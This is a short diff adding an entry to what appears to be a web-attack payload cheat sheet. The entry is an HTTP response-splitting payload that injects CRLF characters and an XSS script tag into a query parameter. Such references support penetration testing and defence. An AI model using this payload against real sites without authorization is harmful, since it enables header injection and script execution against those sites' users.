@@ -136,6 +136,12 @@ Set-Cookie: session_name=setsessionidvalue
 Content-Length: 121
 ```
 
+**HTTP response splitting => XSS**
+```http
+?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
+```
+
+
 ### ============================================================
 ### Authentication and Session Management
 ### ============================================================
